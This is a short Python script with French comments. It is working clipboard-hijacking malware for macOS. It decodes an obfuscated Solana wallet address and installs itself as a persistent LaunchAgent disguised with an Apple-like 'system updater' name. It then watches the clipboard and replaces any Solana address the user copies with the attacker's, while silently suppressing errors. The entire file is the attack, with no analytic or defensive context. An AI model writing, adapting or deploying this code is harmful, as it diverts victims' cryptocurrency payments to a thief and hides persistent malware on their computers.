import pyperclip as cp
import re
import time
import os
import base64
import plistlib
import subprocess

# --- CONFIGURATION ---
# Remplace par ton adresse Solana encodée en base64
A1 = base64.b64decode("NkNLZHJDM1RBcENBaE5OeGFIbWcyZU5QQzRkeWd0MUZEUkZCcVJjZzZVdHA=").decode()

# Regex pour les adresses Solana
REG = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'

def install_persistence():
    """Installe la persistance via LaunchAgents sur macOS."""
    try:
        # Chemin du script actuel
        script_path = os.path.abspath(__file__)
        python_path = "/usr/bin/python3"  # Chemin standard sur macOS

        plist_name = "com.apple.system.updater"
        plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{plist_name}.plist")

        plist_content = {
            "Label": plist_name,
            "ProgramArguments": [python_path, script_path],
            "RunAtLoad": True,
            "KeepAlive": True,
        }

        # Créer le dossier LaunchAgents s'il n'existe pas
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)

        # Écrire le fichier plist
        with open(plist_path, "wb") as f:
            plistlib.dump(plist_content, f)

        # Charger le LaunchAgent
        subprocess.run(["launchctl", "unload", plist_path], stderr=subprocess.DEVNULL)
        subprocess.run(["launchctl", "load", plist_path], check=True)

    except Exception:
        pass

def run():
    install_persistence()
    last = ""
    while True:
        try:
            curr = cp.paste()
            if curr != last:
                if re.match(REG, curr):
                    cp.copy(A1)
                    last = A1
                else:
                    last = curr
        except Exception:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    run()